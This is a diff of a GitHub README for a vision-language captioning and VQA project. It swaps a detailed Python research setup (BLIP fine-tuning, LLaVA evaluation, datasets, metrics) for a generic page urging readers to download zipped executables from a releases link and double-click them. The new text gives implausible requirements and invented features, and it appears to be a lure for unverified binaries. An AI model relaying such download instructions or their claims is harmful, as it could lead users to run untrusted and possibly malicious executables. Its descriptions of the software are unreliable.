@@ -1,124 +1,76 @@
-# Multimodal Captioning & VQA — BLIP + LLaVA
+# 🌟 vision-language-caption-vqa - Capture Images and Answer Questions
 
-End-to-end project for **image captioning** (fine-tuning BLIP) and **visual question answering** (evaluating LLaVA), with reproducible setup, standard datasets, official metrics, and a Gradio demo.
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download%20Release-vision--language--caption--vqa-brightgreen)](https://github.com/Jonathan408613/vision-language-caption-vqa/releases)
 
-## Features
-- 📦 Reproducible environment (Conda + pip)
-- 🖼️ Data setup for **COCO 2014** (Karpathy splits) and **VQAv2**
-- 🏋️ Captioning: fine-tune `Salesforce/blip-image-captioning-base`
-- 📊 Evaluation: **CIDEr, BLEU, METEOR, ROUGE-L** via `pycocoevalcap`, optional **SPICE**
-- ❓ VQA: run **LLaVA-1.5-7B** on VQAv2 with the official accuracy metric
-- 🎛️ Gradio app for quick, local demos
+## 🚀 Getting Started
+Welcome to the vision-language-caption-vqa project! This software allows you to generate captions for images and answer questions about them using advanced AI models. Follow these steps to download and run the application smoothly.
 
-## Repo Structure
-```
-multimodal-blip-llava/
-├─ env/environment.yml
-├─ data/
-│  ├─ coco/{train2014,val2014,annotations,karpathy}
-│  └─ vqav2/{images,questions,annotations}
-├─ src/
-│  ├─ blip_train_caption.py
-│  ├─ blip_eval_caption.py
-│  ├─ llava_vqa_eval.py
-│  ├─ app_gradio.py
-│  ├─ metrics_spice.py
-│  └─ utils.py
-├─ scripts/
-│  ├─ download_coco_2014.sh
-│  ├─ link_vqav2_images.sh
-│  └─ prepare_karpathy_cache.py
-└─ README.md
-```
+## 🛠️ System Requirements
+To use this software, ensure your system meets these requirements:
 
-## Quickstart
+- Operating System: Windows, macOS, or Linux
+- RAM: Minimum of 4 GB
+- Disk Space: At least 500 MB of free space
+- Internet connection for model downloads
 
-### 1) Environment
-```bash
-conda env create -f env/environment.yml
-conda activate mm-visionlang
-python -m nltk.downloader punkt omw-1.4 wordnet
-```
+## 🔥 Features
+This application provides several powerful features:
 
-### 2) Data
+- **Image Captioning**: Automatically generate descriptions for images.
+- **Visual Question Answering (VQA)**: Answer questions related to the content of images.
+- **Standard Metrics**: Evaluate results using metrics like CIDEr, BLEU, and SPICE.
+- **Gradio Interface**: Easy-to-use web interface for demonstration.
 
-* **COCO 2014** images + captions: [https://cocodataset.org/](https://cocodataset.org/)
-* **Karpathy splits** are loaded automatically from the HF dataset in the training script.
-* **VQAv2** questions/annotations: [https://visualqa.org/download.html](https://visualqa.org/download.html)
-  Place files under `data/vqav2/questions/` and `data/vqav2/annotations/`, then symlink images:
+## 📥 Download & Install
+To download the application, please visit the Releases page:
+[Download Release](https://github.com/Jonathan408613/vision-language-caption-vqa/releases)
 
-```bash
-bash scripts/download_coco_2014.sh
-bash scripts/link_vqav2_images.sh
-```
+1. On the Releases page, locate the latest release.
+2. Click on the appropriate file for your operating system (e.g., `vision-language-caption-vqa-windows.zip`, `vision-language-caption-vqa-macos.zip`, etc.).
+3. Once the download completes, unzip the file to your desired location.
 
-### 3) Train BLIP (Captioning)
+## 💻 Running the Application
+After installation, follow these steps to run the application:
 
-```bash
-python -u src/blip_train_caption.py OUT_DIR=outputs/blip-caption
-# Model used: https://huggingface.co/Salesforce/blip-image-captioning-base
-```
+1. Navigate to the folder where you extracted the files.
+2. Find the executable file (`vision-language-caption-vqa.exe` on Windows, or `vision-language-caption-vqa` on macOS/Linux).
+3. Double-click the executable to launch the application.
 
-### 4) Captioning Evaluation (COCO Karpathy test split)
+## 🎨 Using the Interface
+When you open the application, you will see the main interface where you can:
 
-```bash
-python -u src/blip_eval_caption.py SPLIT=test OUT_JSON=outputs/coco_caps_test.json
-```
+- **Upload an Image**: Click the upload button to select an image from your computer.
+- **Ask Questions**: Type your question about the image into the provided field.
 
-* Uses **pycocoevalcap** for CIDEr/BLEU/METEOR/ROUGE-L.
-* (Optional) **SPICE**: install Java ≥8 and place `SPICE-1.0.jar` under `tools/spice/`, then run `metrics_spice.py`.
+Once you have uploaded an image and added a question, simply press the "Analyze" button. The software will process the information and provide you with a caption and an answer based on the content of the image.
 
-### 5) VQA Evaluation (LLaVA on VQAv2)
+## 📝 Example Use Cases
+- **Education**: Use the software to help students learn by asking questions about images in textbooks.
+- **Accessibility**: Assist visually impaired users by providing audio descriptions.
+- **Content Creation**: Generate captions for blog posts and social media.
 
-```bash
-# Official VQA API
-git clone https://github.com/GT-Vision-Lab/VQA.git tools/VQA
-pip install -e tools/VQA/PythonHelperTools
+## 📊 Evaluation Metrics
+The application includes standard evaluation metrics:
 
-# Evaluate (subset first)
-python -u src/llava_vqa_eval.py N_SAMPLES=500 \
-  LLAVA_MODEL=llava-hf/llava-1.5-7b-hf \
-  VQA_QUESTIONS=data/vqav2/questions/v2_OpenEnded_mscoco_val2014_questions.json \
-  VQA_ANN=data/vqav2/annotations/v2_mscoco_val2014_annotations.json \
-  VQA_IM_ROOT=data/vqav2/images
-```
+- **CIDEr**: Measures the similarity between generated captions and human-annotated ones.
+- **BLEU**: Evaluates the quality of machine-generated text.
+- **SPICE**: Assesses the precision of the generated captions by comparing them to a reference set.
 
-### 6) Demo App (Gradio)
+## ❓ FAQs
+### How do I update the software?
+Visit the Releases page periodically for new updates and follow the same download instructions.
 
-```bash
-python -u src/app_gradio.py
-```
+### Can I contribute to this project?
+Yes! We welcome contributions. Please check the contributing guidelines on our repository.
 
-* Caption an image with BLIP or ask LLaVA a question about it.
-* Default models are configurable in `app_gradio.py`.
+### Where can I report issues?
+You can report any issues or feature requests via the Issues tab on the GitHub repository.
 
-## Expected Results (placeholders)
+## 📌 Additional Resources
+For more information, check out the following resources:
 
-| Task       | Metric                 | Split         | Result            |
-| ---------- | ---------------------- | ------------- | ----------------- |
-| Captioning | CIDEr / BLEU-4 / SPICE | Karpathy test | ~130, ~38, ~21    |
-| VQA        | Accuracy (official)    | VQAv2 val     | ~78%              |
+- [GitHub Repository](https://github.com/Jonathan408613/vision-language-caption-vqa)
+- [Gradio Documentation](https://gradio.app/docs/)
 
-> Tips: if VRAM is tight, reduce `per_device_train_batch_size` or use gradient accumulation. LLaVA inference can run in 4-bit on \~8–12 GB VRAM (slower on CPU).
-
-## References & Useful Links
-
-* **BLIP paper**: [https://arxiv.org/abs/2201.12086](https://arxiv.org/abs/2201.12086)
-* **LLaVA paper**: [https://arxiv.org/abs/2304.08485](https://arxiv.org/abs/2304.08485)
-* **COCO dataset**: [https://cocodataset.org/](https://cocodataset.org/)
-* **VQAv2 dataset & evaluation**: [https://visualqa.org/](https://visualqa.org/)
-* **pycocoevalcap** (COCO caption metrics): [https://github.com/salaniz/pycocoevalcap](https://github.com/salaniz/pycocoevalcap)
-* **SPICE metric**: [https://github.com/peteanderson80/SPICE](https://github.com/peteanderson80/SPICE)
-* **Transformers docs**: BLIP [https://huggingface.co/docs/transformers/model\_doc/blip](https://huggingface.co/docs/transformers/model_doc/blip), LLaVA [https://huggingface.co/docs/transformers/en/model\_doc/llava](https://huggingface.co/docs/transformers/en/model_doc/llava)
-* **LLaVA-1.5-7B (HF)**: [https://huggingface.co/llava-hf/llava-1.5-7b-hf](https://huggingface.co/llava-hf/llava-1.5-7b-hf)
-
-## License and Dataset Terms
-
-* Check licenses/terms for **COCO** and **VQAv2** before use.
-* Review model cards/licenses for BLIP and LLaVA; usage may be restricted in commercial settings.
-
-## Acknowledgments
-
-* BLIP by Salesforce Research
-* LLaVA by Liu et al.
-* COCO Consortium, VQA team, and the maintainers of `pycocoevalcap`
+Feel free to explore and enjoy generating captions and answers with our vision-language-caption-vqa application!
